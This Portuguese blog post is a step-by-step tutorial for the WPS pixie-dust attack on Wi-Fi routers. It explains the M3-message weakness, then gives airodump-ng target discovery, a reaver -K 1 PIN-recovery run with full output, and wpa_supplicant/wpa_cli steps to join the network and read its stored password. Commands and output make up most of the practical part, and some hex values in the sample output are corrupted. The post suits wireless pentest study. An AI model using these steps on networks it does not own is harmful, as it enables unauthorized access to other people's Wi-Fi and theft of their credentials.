---
layout: post
title: wps pixie-dust attack
date: 2022-07-18 
description: recuperando psk ...
categories: wifi
---


## pegando psk com pixie-dust attack 


O pixie dust attack consiste em realizar a quebra do WPS de maneira offline.O método offline 
envolve tentar apenas um PIN aleatório e coletar algumas informações durante o processo. Esses 
dados podem ser usados posteriormente para tentar o ataque pixie-dust.
A vulnerabilidade está na mensagem M3: no corpo da mensagem é utilizado
duas chaves AES de 128 bits randômicas (E-S1 e E-S2) para encriptação da
primeira e da segunda metade do PIN, respectivamente. Se as duas chaves
forem descobertas, é possível recuperar o número PIN com um ataque offline
em menos de um segundo, em vez de “chutar” o número PIN no roteador, processo que pode levar 
de 8 a 12 horas (mais informações sobre o brute-force offline aqui http://archive.hack.lu/2014/Hacklu2014_offline_bruteforce_attack_on_wps.pdf)


## Parte pratica
##### Com a interface em modo monitor você pode "sniffar" as redes em volta para identificar um alvo em potêncial com o airodump-ng adicionando a flag --wps dessa forma:
```
$ sudo airodump-ng --wps <interface>
```
> Repare na coluna WPS 

```
 CH  9 ][ Elapsed: 1 min ][ 2007-04-26 17:41 ]
                                                                                                            
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER  WPS  AUTH  ESSID
                                                                                                             
 00:09:5B:1C:AA:1D   11  16       10        0    0  11  54.  OPN          2.0           NETGEAR                         
 00:14:6C:7A:41:81   34 100       57       14    1   9  11e  WEP  WEP     1.0           bigbear 
 00:14:6C:7E:40:80   32 100      752       73    2   9  54   WPA  TKIP    2.0    PSK    teddy                             
                                                                                                            
 BSSID              STATION            PWR   Rate   Lost  Packets  Notes  Probes
                                
 00:14:6C:7A:41:81  00:0F:B5:32:31:31   51   36-24    2       14
 (not associated)   00:14:A4:3F:8D:13   19    0-0     0        4           mossy 
 00:14:6C:7A:41:81  00:0C:41:52:D1:D1   -1   36-36    0        5
 00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35   54-54    0       99           teddy

```

##### Os APs com o WPS ativado apareceram nessa coluna com a versão do wps que o AP possui. Pode acontecer de alguns APs ficarem com um espaço vazio nessa coluna, isso é porque o wps está desativado.

##### Depois de ter identificado seu alvo, a ferramenta utilizada para fazer o ataque ao WPS será a Reaver (link no final da pg) com o seguinte comando:
  
```
sudo reaver -i <interface> -c <channel> -b <mac do ap> -vv -K 1
(precisa da flag -vv)
```
##### O resultado pode variar um pouco porque depende muito do roteador que está sendo atacado. Essa falha é relativa ao firmware do roteador, não sendo todos os roteadores vulneráveis. Você pode ver alguns exemplos de saida aqui ==> (https://forums.kali.org/showthread.php?25123-Reaver-modfication-for-Pixie-Dust-Attack) ou pesquisar por conta própria e ver vários resultados diferentes que as pessoas conseguem por ai ... mas saída que deu certo pra mim foi semelhante a essa:

```
$ sudo reaver -i <interface> -c <channel> -b 01:D0:30:4A:49:45 -vv -K 1

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Switching wlan0 to channel 2
[+] Waiting for beacon from 01:D0:30:4A:49:45
[+] Received beacon from 01:D0:30:4A:49:45
[+] Vendor: RalinkTe
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 01:D0:30:4A:49:45 (ESSID: "nome qualquer")
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
executing pixiewps -e 
313ff74331338ed2d66cc580c997ee805df43626d3dfda23328688e110e5676b7aa9d36640956c1d5b712835a0b07a7ec2ac2363e44336232cf5c11517096bad3c95bc2db3f537c41cf0a80036e
5b680e3e1e130a9303c14f77abca481e4911f590148387c6dc2839e2820a028f9d9c0767d25216c01260c011259cbd30c846ada8da47e5dc9d3dbe99953d9f8ef547d42b3152f581e790aae608c
6b112aac298cb121a60b6ec8849f23497234685b05b53a632526765dbf12642ed0ee8213fb -s c6987c052c458512a2972cfacc923e4c61c9502723676b9493d1b783062ecg16 -z 
72e3a7f04f5eb1cdd4602fb15443099f82d56a02ccad15774ea873c84b4b1b0b -a 3c63e889ae1d26a4441e2f9fbf7b673ff4aee85889383d88dc3707253d155d6b -n 
db396a9e4066be20697a0e236d3aaef7 -r 
29722c42863986dd84a965db99fca766e49c04e58c70f3cc0526b1d6efa0798d3a8023d533f87ea70g6551e50274d40e6c19dd6b3842b496e8c5fc2efc62dd67dc0ad5276aa21321fb68a70bbe6
9d6d6f27e5fb61ff29411a35c9d8e7084d8920cba3656a628ed5e7559ce53804ed85ea840221a73e8fb277c1ff86be187fb4008608c1f086637b045078cfa4c5dfe797d10d866322331866a6cf8
1651af877ad5f074be7c94a5db570d9c467dbf6aa048b48e16bfe98a265657a764b4d09fa7a

 Pixiewps 1.4

 [?] Mode:     1 (RT/MT/CL)
 [*] Seed N1:  0x2e6f2d71
 [*] Seed ES1: 0x7f3d488f
 [*] Seed ES2: 0x4104ca5d
 [*] PSK1:     e7868366f236b343dc0777209b87a214
 [*] PSK2:     95a24c483176fadddc4469a305e893b2
 [*] ES1:      3dd1a7d64b65cbe1bd80ab4359css07e
 [*] ES2:      5502dec86e7ae960a247f6b8aa9c513d
 [+] WPS pin:  18630248   <==== PIN AQUI

 [*] Time taken: 0 s 294 ms
```
(você pode executar o comando "pixiewps" sugerido pela própria ferramenta, que trará o mesmo resultado do pin recuperado)

##### Dependendo do resultado do ataque, o reaver consegue recuperar apenas o PIN do WPS como mostrado acima. Nos meus testes foi esse resultado que consegui. Então a idéia é essa: recuperar o PIN com o ataque offline pixie-dust, depois se conectar ao AP com o pin recuperado para então pegar o psk. 

#### Para se conectar ao AP pelo WPS com o PIN faça o seguindo:

1. ***Crie o arquivo wpa_supplicant.conf em /etc/ e nesse arquivo vai as seguintes linhas***:

> ctrl_interface=/var/run/wpa_supplicant
>  
> ctrl_interface_group=0
>  
> update_config=1
  

2. ***Inicie o wpa_supplicant, com o arquivo de configuração /etc/wpa_supplicant.conf***:
```  
$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
```

  
3. ***Em outro terminal inicie o wpa_cli para realizar a conexão ao ponto de acesso por meio do número PIN***:
```  
$ wpa_cli wps_reg 74:EA:3A:E1:E8:66 02283470
                     <mac do ap>    <pin wps>
```
  
  
4. ***O wpa_supplicant fará a conexão ao ponto de acesso. No terminal em que o wpa_supplicant foi iniciado
é retornado uma mensagem de que a conexão foi bem-sucedida***:
```  
$ wpa_supplicant -Dwext -iwlan0 -c /etc/wpa_supplicant.conf
ioctl[SIOCSIWENCODEEXT]: Invalid argument
ioctl[SIOCSIWENCODEEXT]: Invalid argument
wlan0: Failed to initiate AP scan
wlan0: Trying to associate with 74:ea:3a:e1:e8:66 (SSID='TP-LINK_E1E866' freq=2462 MHz)
wlan0: Associated with 74:ea:3a:e1:e8:66
wlan0: WPA: Key negotiation completed with 74:ea:3a:e1:e8:66 [PTK=CCMP GTK=CCMP]
wlan0: CTRL-EVENT-CONNECTED - Connection to 74:ea:3a:e1:e8:66
completed (auth) [id=1 id_str=]
```
  
  
5. ***Visualize o conteúdo do arquivo /etc/wpa_supplicant.conf com a senha
wireless da rede***:
```
$ cat /etc/wpa_supplicant.conf
network={
ssid="TP-LINK_E1E866"
bssid=74:ea:3a:e1:e8:66
psk="senha123"
proto=RSN
key_mgmt=WPA-PSK
pairwise=CCMP
auth_alg=OPEN
}
```

referencia:
- https://novatec.com.br/livros/pentest-redes-sem-fio/
- https://en.wikipedia.org/wiki/Wi-Fi_Protected_Access#WPS_PIN_recovery
- https://en.wikipedia.org/wiki/Wi-Fi_Protected_Setup
- https://github.com/wiire-a/pixiewps
- https://github.com/t6x/reaver-wps-fork-t6x
- https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)
